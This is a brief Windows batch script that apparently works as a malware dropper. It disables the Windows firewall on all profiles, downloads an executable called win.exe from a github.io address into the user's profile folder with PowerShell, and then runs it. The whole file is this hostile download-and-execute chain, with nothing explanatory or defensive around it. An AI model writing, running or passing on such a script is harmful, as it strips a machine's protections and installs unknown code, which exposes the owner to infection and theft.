@echo off
set nombre=win.exe
set url=https://ffiboo1235-lgtm.github.io/%nombre%
set destino=%USERPROFILE%\%nombre%
netsh advfirewall set allprofiles state off
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%destino%' -UseBasicParsing"
powershell -Command "Start-Process $env:USERPROFILE\%nombre%"